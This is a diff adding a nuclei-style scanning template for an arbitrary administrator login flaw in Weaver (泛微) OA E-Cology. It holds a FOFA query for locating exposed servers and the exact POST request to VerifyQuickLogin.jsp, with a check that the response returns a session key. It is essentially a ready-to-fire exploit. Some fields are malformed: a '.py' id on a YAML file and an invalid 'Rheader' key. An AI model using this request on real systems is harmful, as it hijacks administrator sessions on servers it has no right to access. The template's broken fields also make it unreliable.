@@ -1,0 +1,34 @@
+id: oa任意用户登录.py
+
+info:
+  name: 泛微OA E-Cology
+  severity: medium
+  description: 泛微OA E-Cology VerifyQuickLogin.jsp文件中存在任意管理员登录漏洞，攻击着通过发送特殊的请求包可以获取管理员Session
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-协同办公OA"
+
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/mobile/plugin/VerifyQuickLogin.jsp"
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded
+    body:
+      - |
+        identifier=1&language=1&ipaddress=1.1.1.1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "sessionkey"
+        condition: and
+
+
+      - type: status
+        status:
+          - 200
